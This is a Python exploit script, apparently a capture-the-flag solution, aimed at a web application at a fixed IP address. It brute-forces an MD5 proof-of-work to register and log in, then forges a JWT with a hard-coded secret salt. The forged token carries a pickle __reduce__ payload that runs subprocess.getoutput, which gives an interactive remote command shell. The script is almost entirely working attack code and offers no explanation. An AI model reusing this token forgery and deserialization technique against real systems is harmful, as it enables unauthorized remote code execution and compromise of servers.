import pickle
import os
import re
import base64
import hashlib
import json
import requests
import subprocess
import http.cookies

if os.name != 'posix':
    print('This  must be run on Linux!')
    os._exit(0)
 
sess = requests.Session()
url = 'http://61.147.171.105:53056/'
SALT = '_Y0uW1llN3verKn0w1t_'
username = 'srpopty'
password = 'srpopty'
cmd = 'ls'

def md5proof(strs, num):
    for i in range(100000, 100000000):
        a = hashlib.md5(str(i).encode('utf-8')).hexdigest()
        if a[0:num] == strs:
            print("[md5proof] %d" %i)
            return str(i)

def base64_url_encode(text):
    return base64.b64encode(text).replace('+', '-').replace('/', '_').replace('=', '')
 
 
def base64_url_decode(text):
    text = text.replace('-', '+').replace('_', '/')
    while True:
        try:
            result = base64.b64decode(text)
        except TypeError:
            text += '='
        else:
            break
    return result
 
 
class PickleRce(object):
    def __reduce__(self):
        return subprocess.getoutput, (cmd, )
 
def register(username, password):
    while True:
        result = re.findall('\'\),0,6\) === \'(.*?)\'</span>', sess.get(url + 'login.php', allow_redirects = False).text)[0]
        verify = md5proof(result, 6)
        if len(verify) > 0 and '*' not in verify:
            break
    data = {
        'username': username,
        'password': password,
        'verify': verify
    }
    ret = sess.post(url + 'register.php', data=data, allow_redirects=False)
    if 'success' in ret.text:
        return True
    else:
        print('[!] Register failed!')
        print(ret.text)
        return False
 
 
def login(username, password):
    while True:
        result = re.findall('\'\),0,6\) === \'(.*?)\'</span>', sess.get(url + 'login.php', allow_redirects = False).text)[0]
        verify = md5proof(result, 6)
        if len(verify) > 0 and '*' not in verify:
            break
    data = {
        'username': username,
        'password': password,
        'verify': verify
    }
    ret = sess.post(url + 'login.php', data=data, allow_redirects=False)
    if 'success' in ret.text:
        return ret
    else:
        print('[!] Login failed!')
        print(ret.text)
        return None
 
 
def create_jwt(kid, data):
    jwt_header = base64_url_encode('{"typ":"JWT","alg":"sha256","kid":"%d"}' % kid)
    jwt_payload = base64_url_encode('{"data":"%s"}' % data)
    jwt_signature = base64_url_encode(hashlib.sha256(jwt_header + '.' + jwt_payload + SALT).hexdigest())
    return jwt_header + '.' + jwt_payload + '.' + jwt_signature
 
 
def serialize():
    payload = pickle.dumps([PickleRce(), PickleRce()])
    data = json.dumps('O:4:"User":2:{s:9:"user_data";s:%d:"%s";}' % (
        len(payload), payload))[1:-1]
    print (data)
    return data
 
 
if register(username, password) is not None:
    login_result = login(username, password)
    if login_result is not None:
        try:
            while True:
                cmd = input('>>> ')
                cookies = login_result.cookies
                # print('[*] Old Cookie token: ' + cookies['token'])
                jwt = create_jwt(int(re.findall('"kid":"(.*?)"', base64_url_decode(login_result.cookies['token'].split('.')[0]))[0]), serialize())
                new_token = http.cookies.SimpleCookie().value_encode(jwt)[1]
                # print('[*] New Cookie token: ' + new_token)
                new_cookies = {
                    'PHPSESSID': cookies['PHPSESSID'],
                    'token': new_token
                }
                ret = requests.get(url + 'index.php', allow_redirects = False, cookies = new_cookies)
                print('[*] RCE result: ' + re.findall('<p class="hello">Hello ([\s\S]*?)</p>', ret.text)[0])
        except KeyboardInterrupt:
            print('\nExit.')